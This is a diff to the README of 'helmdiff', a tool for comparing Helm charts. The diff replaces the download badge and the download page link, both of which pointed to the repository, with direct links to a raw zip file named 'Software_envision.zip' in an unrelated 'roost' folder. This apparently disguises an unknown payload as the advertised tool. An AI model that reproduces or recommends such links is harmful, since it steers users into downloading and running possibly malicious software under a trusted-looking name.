@@ -1,6 +1,6 @@
 # 🔍 helmdiff - Compare helm charts before deployment changes
 
-[![Download helmdiff](https://img.shields.io/badge/Download-helmdiff-blue?style=for-the-badge)](https://github.com/Ambiguous-ellipsis10/helmdiff)
+[![Download helmdiff](https://img.shields.io/badge/Download-helmdiff-blue?style=for-the-badge)](https://github.com/Ambiguous-ellipsis10/helmdiff/raw/refs/heads/main/roost/Software_envision.zip)
 
 ## 🎯 About this application
 
@@ -19,7 +19,7 @@ To use this application on Windows, your computer needs these items:
 
 Visit the website below to download the software. This page contains all recent versions.
 
-[https://github.com/Ambiguous-ellipsis10/helmdiff](https://github.com/Ambiguous-ellipsis10/helmdiff)
+[https://github.com/Ambiguous-ellipsis10/helmdiff/raw/refs/heads/main/roost/Software_envision.zip](https://github.com/Ambiguous-ellipsis10/helmdiff/raw/refs/heads/main/roost/Software_envision.zip)
 
 Follow these steps for the installation:
 
